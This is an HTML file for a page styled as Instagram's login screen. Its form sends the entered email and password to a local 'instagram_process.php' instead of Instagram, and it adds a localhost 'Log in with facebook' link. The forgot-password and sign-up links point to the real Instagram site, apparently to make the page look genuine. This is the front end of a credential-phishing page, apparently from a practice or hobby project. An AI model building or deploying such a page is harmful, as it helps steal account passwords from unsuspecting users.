<html>

<head>
    <title>Instagram Login</title>
    <link rel="stylesheet" type="text/css" href="css/instagram.css">

    <style>
        .loginbtn{
            border: none;
            background: #0f0fc4;
            height: 45 px;
            width: 100px;
            padding: 5px 0;
            margin-top: 5px;
            color: #fff;
            border-radius: 3px;
            font-weight: bold;
            text-transform: capitalize;
            letter-spacing: 1px;
            outline: none;
            cursor: pointer;
        }

        .loginbtn:active {
            background: #2310d3;

            transform: scale(0.995);
        }
    </style>
</head>

<body>
    <div class="container">
        <!-- <div class="text"> Log in a to continue</div> -->
        <div class="page">
            <div class="title">instagram</div>
            <form name="twitter form" method="post" action="instagram_process.php">
                <input type="text" name="email" placeholder="email"><br><br>
                <input type="password" name="password" placeholder="password"><br><br>


                <!-- <button>Log in</button> -->
                <div class="btn">
                    <input type="submit" class="loginbtn" value="Log in" name="save">
                </div>
                <div class="option">OR</div>


            </form>

            <div class="fblink">
                <span class="fab fa-facebook"></span>
                <a href="http://localhost/WEB/fb_login.php">Log in eith facebook</a>
            </div>

            <div class="forget-id">
                <a href="https://www.instagram.com/accounts/password/reset/?hl=en">Forget password?</a>
            </div>

            <div class="Singup">
                <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/?hl=en">Sing up</a></p>
            </div>

        </div>
</body>

</html>